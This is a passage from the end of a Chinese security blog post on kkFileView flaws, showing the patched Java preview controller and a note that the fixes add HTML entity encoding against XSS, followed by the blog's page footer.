<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping( &quot;/picturesPreview&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">picturesPreview</span><span class="params">(String urls, Model model, HttpServletRequest req)</span> &#123;</span><br><span class="line">    String fileUrls;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileUrls = WebUtils.decodeUrl(urls);</span><br><span class="line">        <span class="comment">// 防止XSS攻击</span></span><br><span class="line">        fileUrls = KkFileUtils.htmlEscape(fileUrls);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> String.format(BASE64_DECODE_ERROR_MSG, <span class="string">&quot;urls&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, errorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;预览文件url：&#123;&#125;，urls：&#123;&#125;&quot;</span>, fileUrls, urls);</span><br><span class="line">    <span class="comment">// 抽取文件并返回文件列表</span></span><br><span class="line">    String[] images = fileUrls.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">    List&lt;String&gt; imgUrls = Arrays.asList(images);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">    <span class="type">String</span> <span class="variable">currentUrl</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;currentUrl&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(currentUrl)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">decodedCurrentUrl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.decodeBase64(currentUrl));</span><br><span class="line">        decodedCurrentUrl = KkFileUtils.htmlEscape(decodedCurrentUrl);   <span class="comment">// 防止XSS攻击</span></span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, decodedCurrentUrl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, imgUrls.get(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> PICTURE_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，对传入前端模板的参数都进行了HTML实体编码</p>
<p>&#x2F;onlinePreview处的修复如下</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kekingcn/kkFileView/commit/8c6f5bf807b492c71e04ce10fac9fa7d93dc1895#diff-fd65fb3fec861ad352ccc6b0962eabd6e8c5daaaa7939a19624199afd4e58e29R33">https://github.com/kekingcn/kkFileView/commit/8c6f5bf807b492c71e04ce10fac9fa7d93dc1895#diff-fd65fb3fec861ad352ccc6b0962eabd6e8c5daaaa7939a19624199afd4e58e29R33</a></p>
<p><img src="https://s2.loli.net/2024/12/20/wBcWzaO6NjnV57D.png" alt="img"></p>
<p>也是加入了HTML实体编码</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/12/20/CVE-2024-42327：Zabbix SQL注入漏洞分析/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/12/15/Apache Struts S2-066 漏洞分析/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
		<section id="comments" class="comments">
			<style>
			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
			</style>
			<div id="vcomment" class="comment"></div>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var valineConfig = {"enable":true,"appId":"Cbgk0YxBpLhiX5GAO3blh1dL-gzGzoHsz","appKey":"sXGSZcQ400OknswrtdEDSiTp","placeholder":"Comment with Email address will get notification when replied","visitor":false,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":false}
valineConfig.el='#vcomment';
new Valine(valineConfig);
    // new Valine({
    //     el: '#vcomment',
    //     appId: "",
    //     appKey: "",
    //     placeholder: "Comment with Email address will get notification when replied",
    //     avatar:"monsterid",
    //     visitor: "false",
    //     requiredFields: "nick,mail".split(','),
    // });
</script>

		</section>
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-12-20 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/cve/">cve<span>5</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/security/">security<span>6</span></a></li> <li><a href="/tags/kkFileView/">kkFileView<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-article-text">简介</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">环境搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8"><span class="toc-article-text">漏洞分析和利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4RCE"><span class="toc-article-text">任意文件写入导致RCE</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">复现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-article-text">修复</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-article-text">任意文件读取</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-article-text">复现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-article-text">修复</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SSRF"><span class="toc-article-text">SSRF</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%8D%E7%8E%B0-2"><span class="toc-article-text">复现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="toc-article-text">修复</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-article-text">任意文件删除</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%8D%E7%8E%B0-3"><span class="toc-article-text">复现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="toc-article-text">修复</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#XSS"><span class="toc-article-text">XSS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%8D%E7%8E%B0-4"><span class="toc-article-text">复现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D-4"><span class="toc-article-text">修复</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 ph0ebus's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
